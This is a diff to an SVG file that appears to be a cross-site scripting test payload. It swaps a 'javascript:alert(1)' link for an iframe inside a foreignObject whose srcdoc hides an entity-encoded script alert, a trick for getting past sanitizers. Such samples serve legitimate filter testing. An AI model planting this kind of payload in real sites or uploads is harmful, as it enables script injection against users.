@@ -1,3 +1,12 @@
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
-    <a href="javascript:alert(1)">xxxxxxxxxxxxxxxxxxxxx</a>
+<!DOCTYPE html>
+
+
+ <svg width="600" height="800" xmlns="http://www.w3.org/2000/svg">
+
+
+     <g>
+   <foreignObject height="600" width="600" y="10">
+    <iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;" height="600" width="600"/>
+   </foreignObject>
+ </g>
 </svg>
